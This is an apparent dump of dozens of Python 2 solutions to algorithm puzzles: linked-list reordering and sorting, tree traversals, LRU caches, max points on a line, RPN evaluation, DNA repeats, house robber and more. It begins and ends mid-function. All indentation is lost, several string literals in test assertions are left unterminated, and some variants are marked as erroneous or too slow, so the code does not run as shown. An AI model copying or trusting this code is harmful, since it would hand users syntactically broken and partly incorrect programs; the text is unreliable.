dummy_head.next = head
pre_cur = dummy_head
while(pre_cur and pre_cur.next):
pre_last = pre_cur.next
if pre_last.next == None:
return
while(pre_last.next.next):
pre_last = pre_last.next
last = pre_last.next
cur = pre_cur.next
cur_next = cur.next
if cur_next!= last and cur!= last:
cur.next = last
last.next = cur_next
pre_last.next = None
if cur_next and cur_next.next==last:
cur_next.next = None
pre_cur = pre_cur.next.next
def reorderList_array(self, head):
lst = []
cur = head
while(cur):
lst.append(cur)
cur = cur.next
lst1 = lst[:len(lst)/2]
lst2 = lst[len(lst)/2:]
lst2.reverse()
lst = []
for i in range(len(lst2)):
try:
lst.append(lst1[i])
except IndexError:
pass
lst.append(lst2[i])
for i in range(len(lst)):
try:
lst[i].next = lst[i+1]
except IndexError:
lst[i].next = None
def reorderList(self, head):
if not head:
return
dummy = ListNode(0)
dummy.next = head
slow_pre = dummy
fast_pre = dummy
while fast_pre.next and fast_pre.next.next:
fast_pre = fast_pre.next
fast_pre = fast_pre.next
slow_pre = slow_pre.next
mid = slow_pre.next
pre = mid
cur = pre.next
while pre and cur:
cur.next, pre, cur = pre, cur, cur.next
mid.next = None
last = pre
cur = dummy.next
while cur!=mid and last!=mid:
cur.next, last.next, last, cur = last, cur.next, last.next, cur.next
if __name__=="__main__":
length = 2
lst = [ListNode(i+1) for i in range(length)]
for i in range(length-1):
lst[i].next = lst[i+1]
Solution().reorderList(lst[0])
cur = lst[0]
while(cur):
print cur.val
cur = cur.next
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def preorderTraversal(self, root):
ret = []
cur = root
while cur:
if not cur.left:
ret.append(cur.val)
cur = cur.right
else:
pre = cur.left
while pre.right and pre.right != cur:
pre = pre.right
if not pre.right:
pre.right = cur
ret.append(cur.val)
cur = cur.left
else:
pre.right = None
cur = cur.right
return ret
def preorderTraversal_memory(self, root):
lst = []
self.preTraverse_itr(root, lst)
return lst
def preTraverse(self, node, lst):
if not node:
return
lst.append(node.val)
self.preTraverse(node.left, lst)
self.preTraverse(node.right, lst)
def preTraverse_itr(self, root, lst):
if not root:
return
stk = [root]
while stk:
node = stk.pop()
lst.append(node.val)
if node.right:
stk.append(node.right)
if node.left:
stk.append(node.left)
if __name__=="__main__":
t1 = TreeNode(1)
t1.left = TreeNode(2)
print Solution().preorderTraversal(t1)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def postorderTraversal(self, root):
lst = []
self.postTraverse_itr(root, lst)
return lst
def postTraverse(self, node, lst):
if not node:
return
self.postTraverse(node.left, lst)
self.postTraverse(node.right, lst)
lst.append(node.val)
def postTraverse_itr(self, root, lst):
if not root:
return
stk = [root]
while stk:
cur = stk.pop()
lst.insert(0, cur.val)
if cur.left:
stk.append(cur.left)
if cur.right:
stk.append(cur.right)
if __name__=="__main__":
t1 = TreeNode(1)
t1.left = TreeNode(2)
print Solution().postorderTraversal(t1)
class Node:
def __init__(self, key, val):
self.key = key
self.val = val
self.prev, self.next = None, None
class LRUCache:
def __init__(self, capacity: int):
self.head = Node(None, None)
self.tail = Node(None, None)
self.head.next = self.tail
self.tail.prev = self.head
self.cap = capacity
self.map = {}
def get(self, key: int) -> int:
if key in self.map:
node = self.map[key]
self._remove(key)
self._appendleft(node)
return node.val
return -1
def put(self, key: int, value: int) -> None:
if key in self.map:
self._remove(key)
elif len(self.map) >= self.cap:
node = self.tail.prev
self._remove(node.key)
node = Node(key, value)
self._appendleft(node)
def _appendleft(self, node: Node):
self.map[node.key] = node
nxt = self.head.next
self.head.next = node
node.prev = self.head
node.next = nxt
nxt.prev = node
def _remove(self, key: int):
node = self.map[key]
prev = node.prev
nxt = node.next
prev.next = nxt
nxt.prev = prev
del self.map[key]
class Node(object):
def __init__(self, key, val):
self.key = key
self.val = val
self.pre, self.next = None, None
class LRUCache(object):
def __init__(self, capacity):
self.cap = capacity
self.map = {}
self.head = None
self.tail = None
def get(self, key):
if key in self.map:
cur = self.map[key]
self._elevate(cur)
return cur.val
return -1
def set(self, key, value):
if key in self.map:
cur = self.map[key]
cur.val = value
self._elevate(cur)
else:
cur = Node(key, value)
self.map[key] = cur
self._appendleft(cur)
if len(self.map) > self.cap:
last = self._pop()
del self.map[last.key]
def _appendleft(self, cur):
if not self.head and not self.tail:
self.head = cur
self.tail = cur
return
head = self.head
cur.next, cur.pre, head.pre = head, None, cur
self.head = cur
def _pop(self):
last = self.tail
if self.head == self.tail:
self.head, self.tail = None, None
return last
pre = last.pre
pre.next = None
self.tail = pre
return last
def _elevate(self, cur):
pre, nxt = cur.pre, cur.next
if not pre:
return
elif not nxt:
assert self.tail == cur
self._pop()
else:
pre.next, nxt.pre = nxt, pre
self._appendleft(cur)
class LRUCache_TLE(object):
def __init__(self, capacity):
self.capacity = capacity
self.q = []
self.dic = {}
def get(self, key):
if key in self.dic:
self.q.remove(key)
self.q.insert(0, key)
return self.dic[key]
else:
return -1
def set(self, key, value):
if key in self.dic:
self.q.remove(key)
self.q.insert(0, key)
else:
if len(self.q)+1 <= self.capacity:
self.q.insert(0, key)
else:
self.dic.pop(self.q.pop())
self.q.insert(0, key)
self.dic[key] = value
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def insertionSortList_TLE(self, head):
comparator = lambda x, y: cmp(x.val, y.val)
dummy_head = ListNode(0)
dummy_head.next = head
closed_tail = dummy_head.next
while(closed_tail and closed_tail.next):
open_head = closed_tail.next
ptr_before = dummy_head
ptr = dummy_head.next
while(ptr_before):
if comparator(ptr, open_head)>0:
ptr_before.next = open_head
closed_tail.next = open_head.next
open_head.next = ptr
break
if ptr==open_head:
closed_tail = closed_tail.next
break
ptr_before = ptr_before.next
ptr = ptr.next
return dummy_head.next
def insertionSortList(self, head):
comparator = lambda x, y: cmp(x.val, y.val)
dummy = ListNode(0)
dummy.next = head
closed_tail = head
while (closed_tail and closed_tail.next):
open_head = closed_tail.next
open_head_next = closed_tail.next.next
if not comparator(closed_tail, open_head)<=0:
pre = dummy
while comparator(pre.next, open_head)<0:
pre = pre.next
open_head.next = pre.next
pre.next = open_head
closed_tail.next = open_head_next
else:
closed_tail = closed_tail.next
return dummy.next
if __name__=="__main__":
import random
lst = [ListNode(i) for i in random.sample(xrange(-1000, 1000), 1000)]
for i in range(len(lst)):
try:
lst[i].next = lst[i+1]
except IndexError:
lst[i].next = None
head = Solution().insertionSortList(lst[0])
current = head
for i in range(len(lst)):
print current.val
current = current.next
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
def __repr__(self):
return repr(self.val)
class Solution:
def sortList_array(self, head):
if head==None:
return None
lst = []
current = head
while(current):
lst.append(current)
current = current.next
comparator = lambda x, y: cmp(x.val, y.val)
lst = sorted(lst, comparator)
for i in range(len(lst)-1):
lst[i].next = lst[i+1]
lst[-1].next = None
return lst[0]
def sortList(self, head):
if not head or not head.next:
return head
dummy = ListNode(0)
dummy.next = head
slow_pre = dummy
fast_pre = dummy
while fast_pre.next and fast_pre.next.next:
fast_pre = fast_pre.next.next
slow_pre = slow_pre.next
mid_head = slow_pre.next
dummy_mid = ListNode(0)
slow_pre.next = None
head = self.sortList(head)
mid_head = self.sortList(mid_head)
dummy.next = head
dummy_mid.next = mid_head
pre = dummy
pre_mid = dummy_mid
while pre.next and pre_mid.next:
if pre.next.val > pre_mid.next.val:
pre.next, pre_mid.next.next, pre_mid.next = pre_mid.next, pre.next, pre_mid.next.next
pre = pre.next
else:
pre = pre.next
if  pre_mid.next:
pre.next = pre_mid.next
return dummy.next
if __name__=="__main__":
length = 5
lst = [ListNode(length-i) for i in range(length)]
for i in range(length-1):
lst[i].next = lst[i+1]
head = Solution().sortList(lst[0])
cur = head
while(cur):
print cur.val
cur = cur.next
class Point:
def __init__(self, a=0, b=0):
self.x = a
self.y = b
class Solution:
def maxPoints_complicated(self, points):
hash_map = {}
length = len(points)
for i in xrange(length):
for j in xrange(i+1, length):
point1 = points[i]
point2 = points[j]
if point1.x == point2.x:
key = (1 << 32, point1.x)
else:
slope = float(point1.y-point2.y)/(point1.x-point2.x)
intersection = slope*point1.x - point1.y
slope = int(slope*1000)
intersection = int(intersection*1000)
key = (slope, intersection)
if key not in hash_map:
hash_map[key] = [0 for _ in points]
hash_map[key][i] = 1
hash_map[key][j] = 1
if (length<=1):
return length
if(len(hash_map)==0):
return 0
maxa = -1<<32
for key, item in hash_map.items():
current = item.count(1)
if current>maxa:
maxa = current
return maxa
def maxPoints(self, points):
maxa = -1<<32
length = len(points)
if (length<=1):
return length
for i in xrange(length):
hash_map = {}
duplicate = 1
for j in xrange(length):
if i==j:
continue
point1 = points[i]
point2 = points[j]
if point1.x==point2.x and point1.y==point2.y:
duplicate += 1
continue
if point1.x==point2.x:
key = 1<<32
else:
slope = float(point1.y-point2.y)/(point1.x-point2.x)
slope = int(slope*10000)
key = slope
if key not in hash_map:
hash_map[key] = 0
hash_map[key]+=1
if hash_map:
max_key = max(hash_map, key=hash_map.get)
max_value = hash_map[max_key]
else:
max_value  = 0
maxa = max(maxa, max_value+duplicate)
return maxa
if __name__=="__main__":
points = [(560, 248), (0, 16), (30, 250), (950, 187), (630, 277), (950, 187), (-212, -268), (-287, -222), (53, 37),
(-280, -100), (-1, -14), (-5, 4), (-35, -387), (-95, 11), (-70, -13), (-700, -274), (-95, 11), (-2, -33),
(3, 62), (-4, -47), (106, 98), (-7, -65), (-8, -71), (-8, -147), (5, 5), (-5, -90), (-420, -158),
(-420, -158), (-350, -129), (-475, -53), (-4, -47), (-380, -37), (0, -24), (35, 299), (-8, -71), (-2, -6),
(8, 25), (6, 13), (-106, -146), (53, 37), (-7, -128), (-5, -1), (-318, -390), (-15, -191), (-665, -85),
(318, 342), (7, 138), (-570, -69), (-9, -4), (0, -9), (1, -7), (-51, 23), (4, 1), (-7, 5), (-280, -100),
(700, 306), (0, -23), (-7, -4), (-246, -184), (350, 161), (-424, -512), (35, 299), (0, -24), (-140, -42),
(-760, -101), (-9, -9), (140, 74), (-285, -21), (-350, -129), (-6, 9), (-630, -245), (700, 306), (1, -17),
(0, 16), (-70, -13), (1, 24), (-328, -260), (-34, 26), (7, -5), (-371, -451), (-570, -69), (0, 27),
(-7, -65), (-9, -166), (-475, -53), (-68, 20), (210, 103), (700, 306), (7, -6), (-3, -52), (-106, -146),
(560, 248), (10, 6), (6, 119), (0, 2), (-41, 6), (7, 19), (30, 250)]
points = [Point(point[0], point[1]) for point in points]
print Solution().maxPoints(points)
assert Solution().maxPoints(points)==22
class Solution(object):
def evalRPN(self, tokens):
ops = ["+", "-", "*", "/"]
def arith(a, b, op):
if (op == "+"):
return a+b
if (op == "-"):
return a-b
if (op == "/"):
return int(float(a)/b)
if (op == "*"):
return a*b
stack = []
for token in tokens:
if token not in ops:
stack.append(int(token))
else:
arg2 = stack.pop()
arg1 = stack.pop()
result = arith(arg1, arg2, token)
stack.append(result)
return stack.pop()
if __name__ == "__main__":
assert Solution().evalRPN(["10", "6", "9", "3", "+", "-11", "*", "/", "*", "17", "+", "5", "+"]) == 22
class Solution:
def reverseWords(self, s):
words_lst = s.split()
words_lst = reversed(words_lst)
return ' '.join(words_lst)
class Solution(object):
def maxProduct_oneline(self, nums):
return max(reduce(lambda A, n: [max(A), min(n, A[1]*n, A[2]*n), max(n, A[1]*n, A[2]*n)], nums[1:], [nums[0]]*3))
def maxProduct(self, nums):
small = nums[0]
large = nums[0]
maxa = nums[0]
for a in nums[1:]:
small, large = min(a, small*a, large*a), max(a, small*a, large*a)
maxa = max(maxa, small, large)
return maxa
def maxProduct_error2(self, nums):
if len(nums) < 2:
return max(nums)
n = len(nums)
F_pos = [0 for _ in xrange(n+1)]
F_neg = [0 for _ in xrange(n+1)]
maxa = 1
for i in xrange(1, n+1):
v = nums[i-1]
if v > 0:
F_pos[i] = F_pos[i-1]*v if F_pos[i-1] != 0 else v
F_neg[i] = F_neg[i-1]*v
elif v == 0:
F_pos[i], F_neg[i] = 0, 0
else:
F_neg[i] = min(0, F_pos[i-1]*v)
F_pos[i] = max(0, F_neg[i-1]*v)
maxa = max(maxa, F_pos[i])
return maxa
def maxProduct_error(self, A):
if not A:
return
length = len(A)
if length==1:
return A[0]
dp = [-1 for _ in xrange(length+1)]
dp[length] = 0
for i in xrange(length-1, -1, -1):
if A[i]<0:
dp[i] = dp[i+1]+1
elif A[i]==0:
dp[i] = 0
else:
dp[i] = dp[i+1]
global_max = -1<<32
cur = 0
for ind, val in enumerate(A):
if cur!=0:
cur *= val
else:
cur = val
if cur<0 and dp[ind+1]<1:
cur = 0
global_max = max(global_max, cur)
return global_max
def maxProduct_dp(self, A):
if not A:
return
length = len(A)
if length==1:
return A[0]
dp = [-1 for _ in xrange(length+1)]
dp[length] = 0
for i in xrange(length-1, -1, -1):
if A[i]<0:
dp[i] = dp[i+1]+1
elif A[i]==0:
dp[i] = 0
else:
dp[i] = dp[i+1]
global_max = -1<<32
cur = 0
start_ptr = 0
end_ptr = 0
while end_ptr<length:
if cur!=0:
cur *= A[end_ptr]
else:
cur = A[end_ptr]
start_ptr = end_ptr
end_ptr += 1
if cur<0 and dp[end_ptr]<1:
while start_ptr<=end_ptr and A[start_ptr]>0:
cur /= A[start_ptr]
start_ptr += 1
if A[start_ptr]<0:
cur /= A[start_ptr]
start_ptr += 1
if start_ptr==end_ptr:
cur = 0
global_max = max(global_max, cur)
return global_max
if __name__=="__main__":
print Solution().maxProduct([2,3,-2,4])
assert Solution().maxProduct([2,-5,-2,-4,3])==24
assert Solution().maxProduct([-2, 0, -1])==0
assert Solution().maxProduct([-2])==-2
assert Solution().maxProduct([2, 3, -2, 4, -2])==96
assert Solution().maxProduct([2, 3, -2, 4, 0, -2])==6
assert Solution().maxProduct([2,3,-2,4])==6
import sys
class Solution(object):
def findMin(self, A):
lo = 0
hi = len(A)
mini = sys.maxint
while lo < hi:
mid = (lo+hi)/2
mini = min(mini, A[mid])
if A[lo] <= A[mid] <= A[hi-1]:
return min(mini, A[lo])
elif A[lo] > A[mid] < A[hi-1]:
hi = mid
else:
lo = mid+1
return mini
if __name__ == "__main__":
num = [7, 1, 2, 3, 4, 5, 6]
assert Solution().findMin(num) == 1
import sys
class Solution(object):
def findMin(self, A):
lo = 0
hi = len(A)
mini = sys.maxint
while lo < hi:
mid = (lo+hi)/2
mini = min(mini, A[mid])
if A[lo] == A[mid]:
lo += 1
elif A[lo] < A[mid] <= A[hi-1]:
return min(mini, A[lo])
elif A[lo] > A[mid] <= A[hi-1]:
hi = mid
else:
lo = mid+1
return mini
if __name__ == "__main__":
num = [7, 1, 2, 2, 3, 4, 5, 6]
assert Solution().findMin(num) == 1
class MinStack:
def __init__(self):
self.stk = []
self.non_asc = []
def push(self, x):
self.stk.append(x)
if len(self.non_asc) == 0 or x <= self.non_asc[-1]:
self.non_asc.append(x)
def pop(self):
x = self.stk.pop()
if x == self.non_asc[-1]:
self.non_asc.pop()
def top(self):
return self.stk[-1]
def getMin(self):
return self.non_asc[-1]
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def upsideDownBinaryTree(self, root):
if not root or not root.left:
return root
left, right = root.left, root.right
root_new = self.upsideDownBinaryTree(root.left)
left.left, left.right = right, root
root.left, root.right = None, None
return root_new
class SolutionComplex(object):
def __init__(self):
self.root = TreeNode(0)
self.cur_new = self.root
def upsideDownBinaryTree(self, root):
if not root:
return
self.traverse(root)
return self.root
def traverse(self, cur):
if not cur:
return
if not cur.left:
self.cur_new.val = cur.val
return
self.traverse(cur.left)
if cur.right: self.cur_new.left = TreeNode(cur.right.val)
self.cur_new.right = TreeNode(cur.val)
self.cur_new = self.cur_new.right
def read4(buf):
return 0
class Solution(object):
def read(self, buf, n):
idx = 0
while idx < n:
buf4 = ["" for _ in xrange(4)]
r = read4(buf4)
if idx+r < n:
buf[idx:idx+r] = buf4[:r]
idx += r
if r < 4: break
else:
buf[idx:n] = buf4[:n-idx]
idx = n
return idx
def read4(buf):
return 0
class Solution(object):
def __init__(self):
self.prev = []
def read(self, buf, n):
l = min(len(self.prev), n)
buf[:l] = self.prev[:l]
self.prev = self.prev[l:]
idx = l
while idx < n:
buf4 = ["" for _ in xrange(4)]
r = read4(buf4)
if idx+r < n:
buf[idx:idx+r] = buf4[:r]
idx += r
if r < 4: return idx
else:
buf[idx:n] = buf4[:n-idx]
self.prev = buf4[n-idx:r]
idx = n
return idx
from collections import defaultdict
class Solution(object):
def lengthOfLongestSubstringTwoDistinct(self, s):
m = defaultdict(int)
i = 0
j = 0
maxa = 0
for j in xrange(len(s)):
m[s[j]] += 1
while len(m) > 2:
m[s[i]] -= 1
if m[s[i]] == 0:
del m[s[i]]
i += 1
maxa = max(maxa, j-i+1)
return maxa
if __name__ == "__main__":
assert Solution().lengthOfLongestSubstringTwoDistinct("ecebaaaaaacdbb") == 7
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def getIntersectionNode(self, headA, headB):
l_a = self._get_len(headA)
l_b = self._get_len(headB)
if l_a > l_b:
l_a, l_b = l_b, l_a
headA, headB = headB, headA
cur_a = headA
cur_b = headB
for i in xrange(l_b-l_a):
cur_b = cur_b.next
while cur_a != cur_b:
cur_a = cur_a.next
cur_b = cur_b.next
return cur_a
def _get_len(self, head):
n = 0
cur = head
while cur:
n += 1
cur = cur.next
return n
class Solution(object):
def isOneEditDistance(self, s, t):
m, n = len(s), len(t)
if m > n: return self.isOneEditDistance(t, s)
if n-m > 1: return False
diff = 0
i, j = 0, 0
while i < m and j < n and diff < 2:
if s[i] == t[j]:
i += 1
j += 1
else:
if m != n:
j += 1
else:
i += 1
j += 1
diff += 1
return diff == 1 or diff == 0 and m != n
class Solution1(object):
def isOneEditDistance(self, s, t):
m, n = len(s), len(t)
if m > n: return self.isOneEditDistance(t, s)
if n-m > 1: return False
diff = 0
i, j = iter(s), iter(t)
a, b = next(i, None), next(j, None)
while a and b and diff < 2:
if a == b:
a, b = next(i, None), next(j, None)
else:
if m != n:
b = next(j, None)
else:
a, b = next(i, None), next(j, None)
diff += 1
return diff == 1 or diff == 0 and m != n
import sys
class Solution:
def __init__(self):
self.A = None
def findPeakElement(self, nums):
self.A = nums
n = len(self.A)
if n < 2:
return 0
l = 0
h = n
while l < h:
m = (l+h)/2
if self._get(m-1) < self._get(m) > self._get(m+1):
return m
elif self._get(m+1) > self._get(m):
l = m+1
else:
h = m
return -1
def _get(self, i):
if i < 0 or i >= len(self.A):
return -sys.maxint-1
else:
return self.A[i]
def findPeakElement_complicated(self, nums):
n = len(nums)
if n < 2:
return 0
l = 0
h = n
while l < h:
m = (l+h)/2
if m == 0 and nums[m] > nums[m+1]:
return m
elif m == n-1 and nums[m] > nums[m-1]:
return m
elif nums[m-1] < nums[m] > nums[m+1]:
return m
elif m+1 < n and nums[m+1] > nums[m]:
l = m+1
else:
h = m
return -1
class Solution(object):
def findMissingRanges(self, nums, lower, upper):
n = len(nums)
ret = []
if not nums:
ret.append([lower, upper])
return map(self.mapper, ret)
if nums[0] > lower:
ret.append([lower, nums[0]-1])
for i in xrange(1, n):
if nums[i] > nums[i-1]+1:
ret.append([nums[i-1]+1, nums[i]-1])
if upper > nums[-1]:
ret.append([nums[-1]+1, upper])
return map(self.mapper, ret)
def mapper(self, x):
if x[0] == x[1]:
return "%d" % x[0]
else:
return "%d->%d" % tuple(x)
import sys
class Solution:
def maximumGap(self, nums):
n = len(nums)
if n < 2:
return 0
g_min = min(nums)
g_max = max(nums)
bin_width = max(1, (g_max-g_min)/n)
bins_min = {}
bins_max = {}
for v in nums:
bin_id = (v-g_min)/bin_width
bins_min[bin_id] = min(bins_min.get(bin_id, sys.maxint), v)
bins_max[bin_id] = max(bins_max.get(bin_id, -sys.maxint-1), v)
max_gap = 0
pre_max = g_min
for i in xrange(0, (g_max-g_min)/bin_width+1):
if i in bins_min:
max_gap = max(max_gap, bins_min[i]-pre_max)
pre_max = bins_max[i]
return max_gap
if __name__ == "__main__":
assert Solution().maximumGap([1, 1000]) == 999
class Solution:
def compareVersion(self, version1, version2):
version1 = map(int, version1.split("."))
version2 = map(int, version2.split("."))
n1 = len(version1)
n2 = len(version2)
for i in xrange(min(n1, n2)):
if version1[i] == version2[i]:
pass
else:
return -1 if version1[i] < version2[i] else 1
if n1 == n2 or n1 > n2 and all(map(lambda x: x == 0, version1[n2:])) or \
n1 < n2 and all(map(lambda x: x == 0, version2[n1:])):
return 0
return -1 if n1 < n2 else 1
class Solution:
def fractionToDecimal(self, numerator, denominator):
sign = 1 if numerator*denominator >= 0 else -1
numerator = abs(numerator)
denominator = abs(denominator)
int_part = numerator/denominator
frac_part = numerator-int_part*denominator
if frac_part:
decimal_part = self.frac(numerator-int_part*denominator, denominator)
ret = str(int_part)+"."+decimal_part
else:
ret = str(int_part)
if sign < 0:
ret = "-" + ret
return ret
def frac(self, num, deno):
ret = []
d = {}
i = 0
while num:
num *= 10
q = num/deno
r = num%deno
if (q, r) in d:
ret.append(")")
ret.insert(d[(q, r)], "(")
return "".join(ret)
ret.append(str(q))
d[(q, r)] = i
i += 1
num -= q*deno
return "".join(ret)
class Solution_error:
def fractionToDecimal(self, numerator, denominator):
int_part = numerator/denominator
fract_part = numerator-int_part*denominator
if fract_part:
decimal_part = self.frac(numerator-int_part*denominator, denominator)
ret = str(int_part)+"."+decimal_part
else:
ret = str(int_part)
return ret
def frac(self, num, deno):
ret = []
d = {}
i = 0
while num:
l = 0
while num < deno:
num *= 10
l += 1
r = num/deno
if r in d:
ret.append(")")
ret.insert(d[r]-(l-1), "(")
return "".join(ret)
for _ in xrange(l-1):
ret.append("0")
i += 1
ret.append(str(r))
d[r] = i
i += 1
num -= r*deno
return "".join(ret)
if __name__ == "__main__":
assert Solution().fractionToDecimal(1, 333) == "0.(003)"
assert Solution().fractionToDecimal(1, 90) == "0.0(1)"
assert Solution().fractionToDecimal(-50, 8) == "-6.25"
assert Solution().fractionToDecimal(7, -12) == "-0.58(3)
class Solution(object):
def twoSum(self, numbers, target):
n = len(numbers)
i = 0
j = n-1
while i < j:
s = numbers[i] + numbers[j]
if s == target:
return i+1, j+1
elif s < target:
i += 1
else:
j -= 1
return -1, -1
class Solution:
def convertToTitle(self, n):
sb = []
while n:
n -= 1
sb.append(chr(ord("A")+n%26))
n /= 26
return "".join(reversed(sb))
class Solution:
def majorityElement(self, nums):
mjr = nums[0]
cnt = 0
for i, v in enumerate(nums):
if mjr == v:
cnt += 1
else:
cnt -= 1
if cnt < 0:
mjr = v
cnt = 1
return mjr
from collections import defaultdict
class TwoSum(object):
def __init__(self):
self.hash_map = defaultdict(int)
def add(self, number):
self.hash_map[number] += 1
def find(self, value):
return any(
value-k in self.hash_map and (value-k != k or self.hash_map[k] > 1)
for k in self.hash_map
)
def find_TLE(self, value):
for k in self.hash_map.keys():
target = value - k
if target in self.hash_map and (target != k or self.hash_map[target] > 1):
return True
return False
class Solution:
def titleToNumber(self, s):
sig = 1
ret = 0
for i in xrange(len(s)-1, -1, -1):
ret += sig*(ord(s[i])-ord('A')+1)
sig *= 26
return ret
class Solution:
def trailingZeroes(self, n):
cnt = 0
while n:
n /= 5
cnt += n
return cnt
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class BSTIterator:
def __init__(self, root):
self.cur = root
self.stk = []
def hasNext(self):
return self.cur or self.stk
def next(self):
while self.cur:
self.stk.append(self.cur)
self.cur = self.cur.left
nxt = self.stk.pop()
self.cur = nxt.right
return nxt.val
import sys
class Solution:
def calculateMinimumHP(self, dungeon):
m = len(dungeon)
n = len(dungeon[0])
F = [[sys.maxint for _ in xrange(n+1)] for _ in xrange(m+1)]
for i in xrange(m-1, -1, -1):
for j in xrange(n-1, -1, -1):
if i == m-1 and j == n-1:
F[i][j] = max(1, 1-dungeon[i][j])
else:
path = min(F[i+1][j], F[i][j+1])
F[i][j] = max(1, path-dungeon[i][j])
return F[0][0]
def calculateMinimumHP_error(self, dungeon):
m = len(dungeon)
n = len(dungeon[0])
if m == 1 and n == 1:
return 1-min(0, dungeon[0][0])
F = [[-sys.maxint-1 for _ in xrange(n+1)] for _ in xrange(m+1)]
for i in xrange(1, m+1):
for j in xrange(1, n+1):
if i == 1 and j == 1:
F[i][j] = dungeon[i-1][j-1]
else:
F[i][j] = max(F[i-1][j], F[i][j-1])+dungeon[i-1][j-1]
F[i][j] = min(F[i][j], dungeon[i-1][j-1])
return 1-F[-1][-1]
if __name__ == "__main__":
assert Solution().calculateMinimumHP([[-3, 5]]) == 4
assert Solution().calculateMinimumHP([[2, 1], [1, -1]]) == 1
class Solution:
def largestNumber(self, nums):
nums = map(str, nums)
nums.sort(cmp=self.cmp, reverse=True)
nums = "".join(nums)
nums = nums.lstrip("0")
if not nums:
nums = "0"
return nums
def cmp(self, a, b):
order = 1
if len(a) > len(b):
order = -1
a, b = b, a
for i in xrange(len(a)):
if int(a[i]) != int(b[i]):
return order*(int(a[i])-int(b[i]))
if len(a) == len(b):
return 0
return order*self.cmp(a, b[len(a):])
if __name__ == "__main__":
assert Solution().largestNumber(
[4704, 6306, 9385, 7536, 3462, 4798, 5422, 5529, 8070, 6241, 9094, 7846, 663, 6221, 216, 6758, 8353, 3650, 3836,
8183, 3516, 5909, 6744, 1548, 5712, 2281, 3664, 7100, 6698, 7321, 4980, 8937, 3163, 5784, 3298, 9890, 1090,
7605, 1380, 1147, 1495, 3699, 9448, 5208, 9456, 3846, 3567, 6856, 2000, 3575, 7205, 2697, 5972, 7471, 1763,
1143, 1417, 6038, 2313, 6554, 9026, 8107, 9827, 7982, 9685, 3905, 8939, 1048, 282, 7423, 6327, 2970, 4453,
5460, 3399, 9533, 914, 3932, 192, 3084, 6806, 273, 4283, 2060, 5682, 2, 2362, 4812, 7032, 810, 2465, 6511, 213,
2362, 3021, 2745, 3636, 6265, 1518, 8398]) == "98909827968595339456944893859149094902689398937839883538183810810780707982784676057536747174237321720571007032685668066758674466986636554651163276306626562416221603859725909578457125682552954605422520849804812479847044453428339323905384638363699366436503636357535673516346233993298316330843021297028227452732697246523622362231322812216213206020001921763154815181495141713801147114310901048
class Solution(object):
def reverseWords(self, s):
self.reverse(s, 0, len(s))
i = 0
while i < len(s):
j = i+1
while j < len(s) and s[j] != " ":
j += 1
self.reverse(s, i, j)
i = j+1
def reverse(self, s, start, end):
i = start
j = end
while i < j-1:
s[i], s[j-1] = s[j-1], s[i]
i += 1
j -= 1
if __name__ == "__main__":
lst = list("the sky is blue")
Solution().reverseWords(lst)
assert "".join(lst) == "blue is sky the
from typing import List
class Solution:
def findRepeatedDnaSequences(self, s: str) -> List[str]:
ret = set()
seen = set()
for i in range(len(s) - 10 + 1):
sub = s[i:i+10]
if sub in seen and sub not in ret:
ret.add(sub)
else:
seen.add(sub)
return list(ret)
class Solution:
def findRepeatedDnaSequences(self, s):
if len(s) < 10:
return []
s = map(self.mapping, list(s))
h = set()
ret = set()
cur = 0
for i in xrange(10):
cur <<= 2
cur &= 0xFFFFF
cur += s[i]
h.add(cur)
for i in xrange(10, len(s)):
cur <<= 2
cur &= 0xFFFFF
cur += s[i]
if cur in h and cur not in ret:
ret.add(cur)
else:
h.add(cur)
return map(self.decode, ret)
def decode(self, s):
dic = {
0: "A",
1: "C",
2: "G",
3: "T"
}
ret = []
for i in xrange(10):
ret.append(dic[s%4])
s >>= 2
return "".join(reversed(ret))
def mapping(self, a):
dic = {
"A": 0,
"C": 1,
"G": 2,
"T": 3,
}
return dic[a]
if __name__ == "__main__":
assert Solution().findRepeatedDnaSequences("AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT") == ['CCCCCAAAAA', 'AAAAACCCCC']
class Solution:
def maxProfit(self, k, prices):
n = len(prices)
if k >= n:
return self.maxProfit_unlimited_transactions(prices)
l = [0 for _ in xrange(k+1)]
g = [0 for _ in xrange(k+1)]
gmax = 0
for i in xrange(1, n):
diff = prices[i] - prices[i-1]
for j in xrange(k, 0, -1):
l[j] = max(g[j-1]+diff, l[j]+diff)
g[j] = max(l[j], g[j])
gmax = max(gmax, g[j])
return gmax
def maxProfit_unlimited_transactions(self, prices):
profit = 0
for i in xrange(1, len(prices)):
profit += max(0, prices[i] - prices[i-1])
return profit
if __name__ == "__main__":
print Solution().maxProfit(2, [1, 2, 4])
class Solution:
def rotate(self, nums, k):
n = len(nums)
k %= n
temp = nums[:n-k]
for i in xrange(n):
if i < k:
nums[i] = nums[n-k+i]
else:
nums[i] = temp[i-k]
class Solution:
def reverseBits(self, n):
ret = 0
BITS = 32
for i in xrange(BITS):
ret += n&1
if i == BITS-1: break
ret <<= 1
n >>= 1
return ret
class Solution:
def hammingWeight(self, n):
cnt = 0
while n:
cnt += n&1
n >>= 1
return cnt
class Solution:
def rob(self, nums):
n = len(nums)
f = [0 for _ in xrange(n+2)]
for i in xrange(2, n+2):
f[i] = max(
f[i-1],
f[i-2] + nums[i-2]
)
return f[-1]
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def rightSideView(self, root):
cur_lvl = []
nxt_lvl = []
ret = []
if root:
cur_lvl.append(root)
while cur_lvl:
ret.append(cur_lvl[-1].val)
while cur_lvl:
cur = cur_lvl.pop(0)
if cur.left: nxt_lvl.append(cur.left)
if cur.right: nxt_lvl.append(cur.right)
cur_lvl = nxt_lvl
nxt_lvl = []
return ret
class Solution:
def __init__(self):
self.dirs = [(-1, 0), (1, 0), (0, -1), (0, 1)]
def numIslands(self, grid):
m = len(grid)
if m < 1:
return 0
n = len(grid[0])
if n < 1:
return 0
cnt = 0
visited = [[False for _ in xrange(n)] for _ in xrange(m)]
for i in xrange(m):
for j in xrange(n):
if not visited[i][j] and grid[i][j] == "1":
self.dfs(grid, i, j, visited)
cnt += 1
